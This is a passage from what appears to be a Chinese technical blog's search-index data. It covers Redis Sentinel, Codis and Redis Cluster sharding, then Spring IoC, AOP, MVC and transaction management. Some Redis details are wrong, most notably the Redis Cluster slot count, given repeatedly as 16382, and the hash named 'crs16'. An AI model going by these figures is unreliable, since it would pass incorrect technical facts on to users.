进行主从切换。\n向客户端提供节点信息：客户端连接集群时，会首先连接Sentinel，通过Sentinel查询主节点的地址，当主节点发生故障时，Sentinel会将最新的节点地址告诉客户端。主从切换后，为使客户端“知道”地址变更了，Sentinel会关闭所有的客户端连接，在重连时使客户端使用新的地址。\n限制主从延迟：可以通过设置参数min-slaves-to-write和min-slaves-max-lag来限制主从延迟，其中，min-slaves-to-write参数表示主节点至少需要有多少个从节点进行正常复制，如果不满足条件，则停止写服务。而min-slaves-max-lag参数表示在多少秒内没有收到从节点的反馈时，认为从节点的同步不正常。\n\n存在的问题哨兵模式虽然解决了主从模式存在的一些问题，但其本身也存在一些弊端，比如数据在每个Redis实例中都是全量存储，极大地浪费了资源，为了解决这个问题，Redis提供了Redis Cluster，实现了数据分片存储。\n分片集群CodisCodis是Redis的集群代理中间件，当客户端向Codis发送指令时，Codis负责将指令转发到后面的Redis实例执行，并将返回结构转回给客户端。Code上挂接的所有Redis实例构成一个Redis集群，当集群空间不足时，可以通过动态增加Redis实例来实现扩容。\n因为单个Codis代理能支撑的QPS有限，可以启动多个Codis代理增加QPS，还可以起到容灾的功能。\nCodis的槽位定位算法：\nCodis将key转发到对应Redis实例的定位机制是通过划分槽位实现的。Codis默认将所有的key划分为1024个槽位（slot），对客户端传入的key进行crc32运算计算hash值，然后用这个hash值对1024取余，这个余数就是key所属的槽位。\n每个槽位都会映射到多个Redis实例。Codis会维护槽位和Redis实例的对应关系。当使用到多个Codis实例，就需要对不同Codis实例的槽位信息进行同步，需要使用一个分布式配置存储库如zookeeper，Codis会监听到槽位信息的变化并同步槽位信息。\nCodis处理Redis扩容：\n当Redis扩容（增加Redis实例）时，会对槽位关系进行调整，并进行自动均衡。\n使用Codis的缺点：\n由于key分散在不同的Redis实例中，所以不再支持事务。\n客户端需要多走一个网络节点（Codis节点）才能到达Redis，性能上比直接访问Redis性能有所下降。\nCodis的优点：\nCodis在设计上比Redis Cluster简单，将分布式配置问题交给了第三方（zookeeper或etcd）负责，省去了编写和维护分布式一致性的工作。而Redis Cluster自己实现了这一点，混合使用了Raft和Gossip协议，有大量需要调优的配置参数，集群出现故障时不容易排查。\nRedis Cluster与Codis不同，Redis Cluster是去中心化的，该集群由多个Redis节点组成，每个节点负责整个集群的一部分数据，它们之间使用一种特殊的二进制协议交互集群信息。\nRedis Cluster将所有key划分为16382个槽位，每个节点负责存储其中一部分槽位映射信息。客户端连接集群时会得到一份集群的槽位配置信息，客户端可以直接根据该信息定位到目标节点（Redis实例）。\nRedis Cluster的槽位定位算法：\nRedis Cluster默认对key使用crs16算法进行hash，得到一个整数值，然后对16382取余得到具体的槽位。\nRedis Cluster还允许用户强制把指定key挂在特定的槽位上，实现方法是在key字符串上添加tag标记。\nRedis Cluster的槽位纠错机制：\n当客户端向一个错误节点发出了指令，该节点会发现指令的key所在的槽位并不归自己管理，这时它会向客户端发送一个特殊的跳跃指令（MOVED指令）携带目标操作的节点地址，告诉客户端去连接这个节点以获取数据。\nRedis Cluster的数据迁移策略：\nRedis Cluster的数据迁移的单位是槽，提供的迁移工具是redis-trib，redis-trib首先会在源节点和目标节点设置好中间过渡状态，然后再一次性获取源节点槽位的所有key列表，再逐个key进行迁移。每个key迁移的过程是，源节点对当前key执行dump指令得到序列化内容，然后向目标节点发送restore指令携带序列化的内容作为参数，目标节点再反序列化就可以把内容恢复到目标节点的内存中。然后返回给源节点OK信息，源节点收到后把当前节点的key删除。\n当源节点正在进行对key的数据迁移，源节点的主线程就会处于阻塞状态，直到key被成功删除。在迁移过程中如果每个key都很小，migrate迁移指令会执行的很快，而如果key比较大，就会导致阻塞源节点的正常服务。\n因为migrate命令是同步阻塞的，因此不会存在一个key正在被迁移又同时被读写的情况，但由于一个slot下可能有部分key被迁移完成，部分key正在等待迁移的情况，因此如果读写的key所属的slot正在被迁移，redis-cluster做如下处理：\n\n客户端根据本地slots缓存发送命令到源节点，如果存在键对象则直接指向并返回结果给客户端。\n如果key对象不存在，但key所在的slot属于本节点，则可能存在于目标节点，这时源节点会回复ASK重定向异常-ASK targetNodeAddr，ASK中携带了目标节点的地址信息。\n客户端从ASK重定向异常提取出目标节点的地址信息（targetNodeAddr），发送asking命令到目标节点。目标节点如果key存在则执行，不存在则返回不存在信息。\n\nRedis Cluster处理网络抖动：\n网络抖动是突然间部分连接不可访问，然后很快又恢复正常的一种现象。\n为解决网络抖动的问题，Redis Cluster提供了配置参数cluster-node-timeout，表示当前某个节点持续timeout的时间失联时，才认定该节点出现故障。如果没有这一配置选项，网络抖动会导致频繁的主从切换。\nGossip协议：\n可能下线（PFail）和确定下线（Fail）：因为Redis Cluster是去中心化的，一个节点认为某个节点失联了并不代表所有节点都认为它失联了，所以集群需要进行一次协商，只有当大多数节点都认为某节点失联了，集群才做出节点已经下线的判断。\nRedis Cluster采用Gossip协议来广播自己的状态以及改变对整个集群节点的在线状态。\nCodis和Redis Cluster的不同\nCodis是中心化的（需要使用如zookeeper维护配置信息），Redis Cluster是去中心化的（通过Raft和Gossip协议自行维护配置信息）。\n客户端访问Codis维护的Redis集群每次都需要经过Codis节点，而客户端访问Redis Cluster维护的Redis集群可以直接根据获取到的配置信息定位到Redis实例。\nCodis的默认槽位数是1024，而Redis Cluster的默认槽位数是16382。\nCodis默认使用crc32算法计算key的hash值，Redis Cluster默认使用的是crc16。\n\nRedis的特点\n是单线程程序。除Redis外，Node.js和Nginx也都是单线程。\n数据存储在内存中。\nI&#x2F;O多路复用，是Redis能够处理大量客户端连接的原因。\n速度快。\n\nRedis 速度快的原因主要包括以下几点：\n\n内存存储：Redis 将数据存放在内存中，而不是硬盘上。因为内存访问速度比硬盘快得多，所以 Redis 能够达到非常快的读写速度，这也是 Redis 被称为高性能数据库的重要原因之一。\n单线程模型：Redis 使用单线程模型，即使用一个线程来处理所有的客户端请求，这使得 Redis 可以避免锁竞争、多线程切换等问题，从而提高了效率。\n高效的网络 IO 模型（ I&#x2F;O 多路复用）：Redis 使用了高效的网络 IO 模型， I&#x2F;O 多路复用的最大优势是系统开销小，系统不必创建进程&#x2F;线程，也不必维护这些进程&#x2F;线程，从而大大减小了系统的开销。\n高效的数据结构：Redis 支持多种数据结构，如字符串、哈希表、列表、集合、有序集合等，这些数据结构经过优化和精简，能够快速地进行插入、删除、查询等操作，从而提高了性能。比如rehash就是优化的一个例子。\n\nReferences\n钱文品. Redis深度历险:核心原理与应用实践. 北京: 电子工业出版社, 2019.1.\nhttps://javaguide.cn/database/redis/redis-questions-01.html#redis-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84\nhttps://redis.io/docs/data-types/\n梁国斌. Redis核心原理与实践. 北京: 电子工业出版社, 2021.8.\n尼恩等. Java高并发核心编程:加强版. 卷3, 亿级用户Web应用架构与实战. 北京: 清华大学出版社, 2022.11.\n\n","categories":["IT"],"tags":["Redis"]},{"title":"Spring","url":"/2023/05/05/Spring/","content":"Spring特性Spring基于J2EE技术实现了一套轻量的Java Web Service系统应用框架，有很多优秀的特性，包括，依赖注入（DI）、控制反转（IoC）、面向切面（AOP）、轻量、灵活\n\n控制反转\n指的是对象依赖的对象，将会在容器的初始化完成后会主动传递给对象，而不需要对象自己创建或查询其依赖的对象，实现了系统对象之间依赖的解耦\nSpring通过依赖注入实现控制反转，依赖注入是一种设计模式，通过该模式，对象不再创建或管理它们所需要的其他对象或服务，而是由容器（例如Spring容器）负责创建和管理这些对象或服务，并注入到需要它们的对象中。\n\n\n面向切面\n面向切面是一种编程范式，用于将系统的横切关注点（如安全性、事务、日志记录等）与业务逻辑分离\n面向切面通过将横切关注点划分为独立的模块，并在运行时动态地将这些模块植入到程序中，从而实现了对业务逻辑的无侵入式增强\nSpring AOP通过使用动态代理技术来实现对目标对象的增强\n\n\n轻量\nspring-web-5.2.0.RELEASE.jar和spring-core-5.2.0.RELEASE.jar均仅有1.4M左右\n只需要少量的操作系统资源\n\n\n灵活\n是模块化的，可以按需引入模块（以jar包依赖的方式引入）\n\n\n\nSpring的核心JAR包Spring是模块化实现的，每个模块对应不同的JAR包\nSpring框架的所有JAR包：\n\n\n\n名称\n简介\n\n\n\nspring-aop\n提供了Spring框架的面向切面编程（AOP）功能，用于在运行时动态地增强应用程序的功能。\n\n\nspring-aspects\n提供了Spring框架的切面库，包括对AspectJ切面的支持和一些通用切面的实现。\n\n\nspring-beans\n提供了Spring框架的BeanFactory和FactoryBean等工厂类，用于管理和配置应用程序中的对象。\n\n\nspring-context\n提供了Spring框架的应用上下文（ApplicationContext），用于管理应用程序中的Bean对象，以及Spring框架的事件驱动编程模型。\n\n\nspring-context-indexer\n提供了一个工具，用于在编译时为Spring应用程序生成索引文件，以提高应用程序启动的速度。\n\n\nspring-context-support\n提供了一些扩展类，用于在Spring应用程序中支持特定的应用场景，例如JPA、Velocity等。\n\n\nspring-core\nSpring框架的核心模块，提供了Spring框架的基本功能，如依赖注入、控制反转、Bean工厂等。\n\n\nspring-expression\n提供了Spring框架的表达式语言（SpEL），用于在应用程序中动态地访问和操作对象。\n\n\nspring-instrument\n提供了Spring框架的Instrumentation API支持，用于在运行时通过Java Agent来提供增强功能。\n\n\nspring-instrument-tomcat\n提供了Spring框架在Tomcat服务器中使用Instrumentation API的支持。\n\n\nspring-jcl\n提供了Spring框架的通用日志抽象库，可以在不同的日志实现之间进行切换。\n\n\nspring-jdbc\n提供了Spring框架的JDBC支持，包括对JdbcTemplate和NamedParameterJdbcTemplate等的封装。\n\n\nspring-jms\n提供了Spring框架的Java Message Service（JMS）支持，用于在应用程序中发送和接收消息。\n\n\nspring-messaging\n提供了Spring框架的消息处理功能，包括对WebSocket、STOMP、AMQP等协议的支持。\n\n\nspring-orm\n提供了Spring框架的对象关系映射（ORM）支持，包括对Hibernate、MyBatis等ORM框架的集成。\n\n\nspring-oxm\n提供了Spring框架的对象XML映射（OXM）支持，用于在Java对象和XML文档之间进行转换。\n\n\nspring-test\n提供了Spring框架的测试支持，包括对JUnit、TestNG等测试框架的集成，以及对Spring应用程序的集成测试支持。\n\n\nspring-tx\n提供了Spring框架对事务的支持，包括声明式事务管理、编程式事务管理、事务传播行为管理、事务隔离级别管理等功能。\n\n\nSpring IoC原理IoC简介Spring IoC（Inversion of Control，控制反转）提供的功能包括，通过Java反射功能实例化Bean对象，建立Bean之间的依赖关系，Bean实例缓存管理、Bean生命周期管理等。\n控制反转的含义：\n\n控制：指的是对象创建（实例化、管理）的权力\n反转：控制权交给外部环境（Spring的IoC 容器）\n\n控制反转怎么理解?： 举个例子：”对象 a 依赖了对象 b，当对象 a 需要使用 对象 b 的时候必须自己去创建。但是当系统引入了 IOC 容器后， 对象 a 和对象 b 之前就失去了直接的联系。这个时候，当对象 a 需要使用 对象 b 的时候， 我们可以指定 IOC 容器去创建一个对象 b 注入到对象 a 中”。 对象 a 获得依赖对象 b 的过程,由主动行为变为了被动行为，控制权反转，这就是控制反转名字的由来。\nBean的装配流程Spring通过读取XML或注解获取Bean的配置信息，并在Bean容器中生成Bean配置注册表，然后根据配置注册表实例化Bean，将Bean实例载入Bean缓存池，业务程序就可以从Bean缓存池中获取Bean。\nBean的作用域Spring 中 Bean 的作用域通常有下面几种：\n\nsingleton : Spring的IoC容器中只有唯一的 Bean 实例。Spring 中的 Bean 默认都是单例的。\nprototype : 每次获取Bean（调用 getBean() 方法）都会创建一个新的 Bean 实例。也就是说，连续 getBean() 两次，得到的是不同的 Bean 实例。\nrequest （仅 Web 应用可用）: 每次 HTTP 请求都会产生一个新的 Bean，该 Bean 仅在当前 HTTP request 内有效。\nsession （仅 Web 应用可用） : 同一个HTTP Session共享一个Bean，不同的HTTP Session使用不同的Bean。\napplication （仅 Web 应用可用）：同一个全局的Session共享一个Bean，一般用于Portlet环境。\nwebsocket（仅 Web 应用可用）：每一次 WebSocket 会话产生一个新的 bean。\n\n除了以上几种标准作用域外，Spring 还支持自定义作用域。在 Spring 中，可以通过实现 Scope 接口并重写对应方法来实现自定义作用域。\nBean的生命周期Spring容器管理Bean，涉及对Bean的创建、初始化、调用、销毁等一系列的流程，这个流程就是Spring Bean的生命周期：\n\n实例化（Instantiation）：当Spring容器启动时，它会根据配置元数据（XML配置、注解等）来实例化Bean对象。这是通过调用构造函数来完成的。\n设置属性（Populate Properties）：在实例化Bean后，Spring容器会通过调用setter方法或直接设置字段的方式，将配置的属性值注入到Bean中。\nAware接口回调：如果Bean实现了特定的Aware接口，Spring容器会在属性设置后相应地回调相关的方法，例如BeanNameAware、BeanFactoryAware、ApplicationContextAware等。\nBeanPostProcessor的前置处理（PostProcess Before Initialization）：Spring容器中存在一种特殊类型的Bean称为BeanPostProcessor，它可以在Bean初始化前后执行一些自定义逻辑。对于所有Bean，这些BeanPostProcessor会在初始化前先执行。\n初始化(Initialization)：在Bean的所有属性设置完成后，Spring容器会调用Bean的初始化方法。可以通过@PostConstruct注解标记该方法。如果Bean实现了InitializingBean接口，容器还会调用它的afterPropertiesSet()方法。\nBeanPostProcessor的后置处理（PostProcess After Initialization）：在Bean初始化完成后，再次运行所有的BeanPostProcessor，但这次是在初始化后执行。\n使用(Bean ready for use)：此时，Bean已经初始化完成，可以被容器及其他Bean使用了。\n销毁(Destruction)：当Spring容器关闭时，会调用单例Bean的销毁方法。可以通过@PreDestroy注解标记该方法，或者实现DisposableBean接口来定义销毁逻辑。\n\n整个流程参考下图：\n\nBeanFactoryBeanFactory是一个类工厂，与传统类工厂不同的是，BeanFactory是类的通用工厂，它可以创建并管理各种类的对象。这些可被创建和管理的对象本身没有什么特别之处，仅是一个POJO，Spring称这些被创建和管理的Java对象为Bean。并且，Spring中所说的Bean比JavaBean更为宽泛一些，所有可以被Spring容器实例化并管理的Java类都可以成为Bean。\nBeanFactory是Spring容器的顶层接口，Spring为BeanFactory提供了多种实现，最常用的是XmlBeanFactory。但它在Spring 3.2中已被废弃，建议使用XmlBeanDefinitionReader、DefaultListableBeanFactory替代。BeanFactory最主要的方法就是 getBean(String beanName)，该方法从容器中返回特定名称的Bean。\nBean定义相关注解Spring的注解将Bean的定义和依赖关系从XML配置中解放出来，应用程序只要使用注解依赖注入即可\nBean具体的定义和依赖关系由Spring的自动装配完成。\n\n\n\n注解\n描述\n\n\n\n@Component\n用于标识一个类为Spring容器的组件（Bean）。通常作用于普通的Java类。\n\n\n@Repository\n用于标识一个类为数据访问层（DAO）的组件。通常用于与数据库交互的类。\n\n\n@Service\n用于标识一个类为业务逻辑层（Service）的组件。通常用于封装业务逻辑的类。\n\n\n@Controller\n用于标识一个类为控制器（Controller）的组件。通常用于处理用户请求和返回视图的类。\n\n\n@Configuration\n用于标识一个类为配置类，其中包含了Bean的定义和配置信息。通常与@Bean注解一起使用。\n\n\n@Profile\n用于基于不同的应用程序环境选择Bean定义，可以与@Conditional一起使用。\n\n\n@Scope\n用于定义Bean对象的作用域，包括Singleton、Prototype、Request、Session等。\n\n\n注入Bean的注解Spring 内置的 @Autowired 以及 JDK 内置的 @Resource 和 @Inject 都可以用于注入 Bean。\n\n\n\nAnnotaion\nPackage\nSource\n\n\n\n@Autowired\norg.springframework.bean.factory\nSpring 2.5+\n\n\n@Resource\njavax.annotation\nJava JSR-250\n\n\n@Inject\njavax.inject\nJava JSR-330\n\n\n\n@Autowired 和 @Resource 的区别：\nAutowired 属于 Spring 内置的注解，默认的注入方式为byType（根据类型进行匹配）。这存在的问题是， 当一个接口存在多个实现类的话，byType这种方式就无法正确注入对象了，因为这个时候 Spring 会同时找到多个满足条件的选择，默认情况下它自己不知道选择哪一个。这种情况下，注入方式会变为 byName（根据名称进行匹配），这个名称通常就是类名（首字母小写），建议通过 @Qualifier 注解来显式指定名称而不是依赖变量的名称。\n@Resource属于 JDK 提供的注解，默认注入方式为 byName，可以通过 name 属性来显式指定名称。如果无法通过名称匹配到对应的 Bean 的话，注入方式会变为byType。\nSpring AOP原理Spring AOP简介Spring AOP通过面向切面技术，将与业务无关或被业务模块共用的代码封装起来，便于减少系统的重复代码，降低模块间的耦合度。\nSpring AOP 的核心概念\n\n\n术语\n翻译\n概念\n\n\n\nAspect\n切面\n包含切入点（Pointcut）和通知（Advice）的类。\n\n\nJoin point\n连接点\n目标对象的所属类中，定义的所有方法均为连接点。\n\n\nPointcut\n切入点\n被切面拦截 &#x2F; 增强的连接点（切入点一定是连接点，连接点不一定是切入点）。\n\n\nAdvice\n通知\n增强的逻辑 &#x2F; 代码，也即拦截到目标对象的连接点之后要做的事情。\n\n\nTarget object\n目标\n被通知的对象。\n\n\nAOP proxy\n代理\n向目标对象应用通知之后创建的代理对象。\n\n\nWeaving\n织入\n将通知应用到目标对象，进而生成代理对象的过程动作。\n\n\nSpring AOP的5种通知类型Spring AOP 提供了以下五种类型的通知：\n\n\n\n术语\n翻译\n定义\n\n\n\nBefore advice\n前置通知\n在切入点之前运行的建议，但不能阻止执行流程继续到切入点（除非它抛出异常）。\n\n\nAfter returning advice\n返回通知\n在切入点正常完成后运行的建议（例如，如果方法返回而不抛出异常）。\n\n\nAfter throwing advice\n异常通知\n在方法通过抛出异常退出时运行的建议。\n\n\nAfter (finally) advice\n后置通知\n无论切入点以何种方式退出（正常或异常返回），都要运行的建议。\n\n\nAround advice\n环绕通知\n在切入点前后都执行。\n\n\nSpring AOP相关注解\n\n\n注解\n翻译名称\n简介\n\n\n\n@Aspect\n切面定义\n用于将类定义为切面，可以在其中定义切点和通知。\n\n\n@Pointcut\n切点定义\n用于定义切点，指定切入点的匹配规则。\n\n\n@Before\n前置通知\n在方法执行之前执行通知。\n\n\n@After\n后置通知\n在方法执行之后执行通知。\n\n\n@AfterReturning\n返回通知\n在方法执行之后返回结果后执行通知。\n\n\n@AfterThrowing\n异常通知\n在方法执行时抛出异常后执行通知。\n\n\n@Around\n环绕通知\n在方法执行之前和之后都可以执行通知。\n\n\nSpring AOP和AspectJ AOP的区别Spring AOP 属于运行时增强，而 AspectJ 是编译时增强。 Spring AOP 基于代理(Proxying)，而 AspectJ 基于字节码操作(Bytecode Manipulation)。\n\nAspectJ是由Xerox PARC（帕洛阿尔托研究中心）的Gregor Kiczales等人开发的。AspectJ最初是一门编程语言，它扩展了Java语言，引入了面向切面编程的概念，并在语言级别上提供了对AOP的支持。后来，AspectJ逐渐发展成为一个功能强大的AOP框架，它可以与Java语言集成，用于实现更高级的横切关注点处理。\n\nSpring AOP 已经集成了 AspectJ ，AspectJ 应该算的上是 Java 生态系统中最完整的 AOP 框架了。AspectJ 相比于 Spring AOP 功能更加强大，但是 Spring AOP 相对来说更简单，\n如果我们的切面比较少，那么两者性能差异不大。但是，当切面太多的话，最好选择 AspectJ ，它比 Spring AOP 快很多。\n多个切面的执行顺序控制多个切面执行顺序的控制方法有：\n\n使用@Order 注解直接定义切面顺序\n实现Ordered 接口重写 getOrder 方法\n\nSpring MVC原理Spring MVC简介Spring MVC 是一个用于构建 Web 应用程序的 Java 框架。它遵循模型-视图-控制器设计模式。\nSpring MVC 的核心组件\nDispatcherServlet：核心的中央处理器，负责接收请求、分发，并给予客户端响应。\nHandlerMapping：处理器映射器，根据 uri 去匹配查找能处理的 Handler ，并会将请求涉及到的拦截器和 Handler 一起封装。\nHandlerAdapter：处理器适配器，根据 HandlerMapping 找到的 Handler ，适配执行对应的 Handler；\nHandler：请求处理器，处理实际请求的处理器。\nViewResolver：视图解析器，根据 Handler 返回的逻辑视图 &#x2F; 视图，解析并渲染真正的视图，并传递给 DispatcherServlet 响应客户端\n\nSpringMVC的执行流程SpringMVC 的工作流程主要包括以下几个步骤：\n\n客户端发送请求：客户端向服务器发送请求，请求可以是一个 URL 地址、一个表单提交或者一个 AJAX 请求。\n\nDispatcherServlet接收请求：DispatcherServlet 是 SpringMVC 框架的核心控制器，它负责接收客户端发送的请求，并将请求转发给HandlerMapping查找对应的处理器，然后再将。\n\nHandlerMapping查找处理器：HandlerMapping 负责根据请求 URL 查找对应的处理器，处理器可以是一个 Controller 或者一个 Restful Web Service。\n\nHandlerAdapter调用处理器：HandlerAdapter 负责调用处理器，将请求传递给处理器进行处理，并获取处理器的处理结果。\n\n处理器处理请求：处理器根据请求的类型和参数，进行相应的业务处理，并返回一个 ModelAndView 对象。\n\n视图解析器解析视图：视图解析器（ViewResolver）根据 ModelAndView 中的视图名，将其解析成对应的视图对象，视图可以是一个 JSP 页面、一个 Thymeleaf 模板或者一个 HTML 片段等。\n\n渲染视图：视图对象根据数据模型和视图模板，生成 HTML 内容，并将其返回给客户端。\n\n返回响应：DispatcherServlet 将视图渲染的结果返回给客户端，客户端可以是一个浏览器、一个移动应用或者一个 API 调用。\n\n\n流程图如下：\n\n总之，SpringMVC 的工作流程涉及到多个组件之间的协作，其中 DispatcherServlet 负责接收请求和控制流程，HandlerMapping 负责查找处理器，HandlerAdapter 负责调用处理器，视图解析器负责解析视图，视图对象负责渲染视图，最终将响应返回给客户端。\n常用的Web注解\n\n\n注解\n翻译名称\n简介\n\n\n\n@Controller\n控制器\n用于将类定义为Spring MVC的控制器，处理HTTP请求并返回响应结果。\n\n\n@ResponseBody\n响应体\n用于指示处理方法的返回值应直接序列化到HTTP响应的响应体中，而不是被解释为视图名称并由视图解析程序解析以生成HTML或其他类型的响应\n\n\n@RestController\nREST控制器\n与@Controller类似，但多了@ResponseBody注解，默认情况下返回JSON或XML格式的响应结果。\n\n\n@RequestMapping\n请求映射\n用于将HTTP请求映射到处理方法上，并指定请求的URL、请求方法、请求参数等。\n\n\n@GetMapping\nGET请求映射\n用于将HTTP GET请求映射到处理方法上，简化了@RequestMapping的用法。\n\n\n@PostMapping\nPOST请求映射\n用于将HTTP POST请求映射到处理方法上，简化了@RequestMapping的用法。\n\n\n@PutMapping\nPUT请求映射\n用于将HTTP PUT请求映射到处理方法上，简化了@RequestMapping的用法。\n\n\n@DeleteMapping\nDELETE请求映射\n用于将HTTP DELETE请求映射到处理方法上，简化了@RequestMapping的用法。\n\n\n@PatchMapping\nPATCH请求映射\n用于将HTTP PATCH请求映射到处理方法上，简化了@RequestMapping的用法。\n\n\n@RequestBody\n请求体\n将HTTP请求体中的数据绑定到处理方法的参数上，用于从HTTP请求体（Body）中提取数据，通常用于处理POST或PUT请求中的数据。\n\n\n@RequestParam\n请求参数\n将HTTP请求URL中的参数绑定到处理方法的参数上，用于从请求的URL中提取查询参数（Query Parameter），查询参数是出现在URL问号后面的键值对。\n\n\n@PathVariable\n路径变量\n将HTTP请求URL中的参数绑定到处理方法的参数上，用于从URL路径中的占位符（通常使用花括号{}包裹）中提取参数。\n\n\nSpring事务Spring的事务管理用法Spring为事务管理提供了一致的编程模板，在高层次上建立了统一的事务抽象。也就是说，不管是选择MyBatis、Hibernate、JPA还是Spring JDBC，Spring都可以让用户以统一的编程模型进行事务管理。\nSpring支持两种事务编程模型：\n\n编程式事务\nSpring提供了TransactionTemplate模板，利用该模板我们可以通过编程的方式实现事务管理，而无需关注资源获取、复用、释放、事务同步及异常处理等操作。相对于声明式事务来说，这种方式相对麻烦一些，但是好在更为灵活，我们可以将事务管理的范围控制的更为精确。\n\n声明式事务\nSpring事务管理的亮点在于声明式事务管理，它允许我们通过声明的方式，在IoC配置中指定事务的边界和事务属性，Spring会自动在指定的事务边界上应用事务属性。相对于编程式事务来说，这种方式十分的方便，只需要在需要做事务管理的方法上，增加@Transactional注解，以声明事务特征即可，可以使用isolation属性声明事务的隔离级别，使用propagation属性声明事务的传播方式。\n@Transactional注解可以标注在类或者方法上。\n\n当它标注在类上时，代表这个类所有公共（public）非静态的方法都将启用事务功能。\n当它标注在方法上时，代表这个方法将启用事务功能。\n\n\n\n@Transactional注解可以作用于哪些地方？\n@Transactional 可以作用在接口、类、类方法。\n\n作用于接口：接口上定义的事务属性将被应用于实现类中的方法。当通过接口调用实现类的方法时，事务将会生效。不推荐这种使用方法，因为一旦标注在Interface上并且配置了Spring AOP 使用CGLib动态代理，将会导致@Transactional注解失效，这因为CGLIB代理是通过继承实现的，而不是基于接口的。\n作用于类：当把@Transactional 注解放在类上时，表示所有该类的public方法都配置相同的事务属性信息。类的@Transactional注解可以覆盖接口的事务配置信息。\n作用于方法：当类配置了@Transactional，方法也配置了@Transactional，方法的@Transactional注解会覆盖类的事务配置信息。\n\nSpring的事务传播方式发生嵌套调用事务方法（非事务方法或事务方法内部调用事务方法）的时候，就要设置方法（调用方法）和嵌套调用的事务方法（被调用的事务方法）之间的Spring的事务传播方式。\n设置方法是给被调用的事务（可以称为，子事务）的@Transactional注解中设置propagation属性。\nSpring在Propagation枚举类中给出了7种类型的事务传播方式，它们规定了事务方法发生嵌套调用时如何进行传播，如下表：\n\n\n\n事务传播方式类型\n说明\n\n\n\nREQUIRED\n如果当前存在一个事务，则加入该事务；如果没有事务，则创建一个新事务。这是最常用的传播行为。\n\n\nSUPPORTS\n如果当前存在一个事务，则加入该事务；如果没有事务，则以非事务方式执行。\n\n\nMANDATORY\n如果当前存在一个事务，则加入该事务；如果没有事务，则抛出异常。\n\n\nREQUIRES_NEW\n创建一个新事务，并挂起当前的事务（如果存在）。新事务独立于当前事务执行。\n\n\nNOT_SUPPORTED\n以非事务方式执行，并挂起当前的事务（如果存在）。\n\n\nNEVER\n以非事务方式执行，如果当前存在事务，则抛出异常。\n\n\nNESTED\n如果当前事务存在，则在嵌套事务中执行，否则行为类似于 REQUIRED。\n\n\n示例：\nimport org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Service;import org.springframework.transaction.annotation.Propagation;import org.springframework.transaction.annotation.Transactional;@Servicepublic class UserService &#123;    @Autowired    private UserRepository userRepository;    //outerMethod方法内发生了嵌套调用事务方法innerMethod    @Transactional    public void outerMethod() &#123;        // Some business logic        userRepository.save(new User(&quot;John&quot;));                // Calling the innerMethod        innerMethod();    &#125;    //给子事务的@Transactional设置propagation属性    @Transactional(propagation = Propagation.REQUIRES_NEW)    public void innerMethod() &#123;        // Some business logic        userRepository.save(new User(&quot;Alice&quot;));    &#125;&#125;\n\nSpring的事务隔离级别Spring在Isolation枚举类中给出了5种类型的事务隔离级别，它们规定了多个事务在并发访问数据库时，彼此之间的执行顺序，如下：\n\n\n\n事务传播方式类型\n翻译\n说明\n\n\n\nISOLATION_DEFAULT\n默认的隔离级别\n使用后端数据库默认的隔离级别，MySQL 默认采用的 REPEATABLE_READ 隔离级别 Oracle 默认采用的 READ_COMMITTED 隔离级别。\n\n\nISOLATION_READ_UNCOMMITTED\n读未提交\n最低的隔离级别，使用这个隔离级别很少，因为它允许读取尚未提交的数据变更，可能会导致脏读、幻读或不可重复读\n\n\nISOLATION_READ_COMMITTED\n读已提交\n允许读取并发事务已经提交的数据，可以阻止脏读，但是幻读或不可重复读仍有可能发生\n\n\nISOLATION_REPEATABLE_READ\n可重复读\n对同一字段的多次读取结果都是一致的，除非数据是被本身事务自己所修改，可以阻止脏读和不可重复读，但幻读仍有可能发生。\n\n\nISOLATION_SERIALIZABLE\n可串行化\n最高的隔离级别，完全服从 ACID 的隔离级别。所有的事务依次逐个执行，这样事务之间就完全不可能产生干扰，也就是说，该级别可以防止脏读、不可重复读以及幻读。但是这将严重影响程序的性能。通常情况下也不会用到该级别。\n\n\n@Transactional(rollbackFor &#x3D; Exception.class)注解Exception 分为运行时异常 RuntimeException 和非运行时异常。\n在 @Transactional 注解中如果不配置rollbackFor属性，那么事务只会在遇到RuntimeException的时候才会回滚，加上 rollbackFor=Exception.class，可以让事务在遇到非运行时异常时也回滚。\n@Transactional失效场景\n@Transactional 应用在非 public 修饰的方法上\n如果Transactional注解应用在非public 修饰的方法上，Transactional将会失效。\n之所以会失效是因为在Spring AOP 代理时，如上图所示 TransactionInterceptor （事务拦截器）在目标方法执行前后进行拦截，DynamicAdvisedInterceptor（CglibAopProxy 的内部类）的 intercept 方法或 JdkDynamicAopProxy 的 invoke 方法会间接调用 AbstractFallbackTransactionAttributeSource的 computeTransactionAttribute 方法，获取Transactional 注解的事务配置信息。\n此方法会检查目标方法的修饰符是否为 public，不是 public则不会获取@Transactional 的属性配置信息。\n注意：protected、private 修饰的方法上使用 @Transactional 注解，虽然事务无效，但不会有任何报错，这是我们很容犯错的一点。\n\n@Transactional 注解属性 propagation 设置错误\n这种失效是由于配置错误，若是错误的配置以下三种 propagation，事务将不会发生回滚。\nTransactionDefinition.PROPAGATION_SUPPORTS：如果当前存在事务，则加入该事务；如果当前没有事务，则以非事务的方式继续运行。 TransactionDefinition.PROPAGATION_NOT_SUPPORTED：以非事务方式运行，如果当前存在事务，则把当前事务挂起。 TransactionDefinition.PROPAGATION_NEVER：以非事务方式运行，如果当前存在事务，则抛出异常。\n\n@Transactional 注解属性 rollbackFor 设置错误\nrollbackFor 可以指定能够触发事务回滚的异常类型。Spring默认抛出了未检查unchecked异常（继承自 RuntimeException 的异常）或者 Error才回滚事务；其他异常不会触发回滚事务。如果在事务中抛出其他类型的异常，但却期望 Spring 能够回滚事务，就需要指定 rollbackFor属性。\n若在目标方法中抛出的异常是 rollbackFor 指定的异常的子类，事务同样会回滚。\n\n事务被同一个类中的方法调用\n开发中避免不了会对同一个类里面的方法调用，比如有一个类Test，它的一个方法A，A再调用本类的方法B（不论方法B是用public还是private修饰），但方法A没有声明注解事务，而B方法有。则外部调用方法A之后，方法B的事务是不会起作用的。这也是经常犯错误的一个地方。\n那为啥会出现这种情况？其实这还是由于使用Spring AOP代理造成的，因为只有当事务方法被当前类以外的代码调用时，才会由Spring生成的代理对象来管理。\n\n事务的异常被catch了\n这种情况是最常见的一种@Transactional注解失效场景。如果B方法内部抛了异常，而A方法此时try 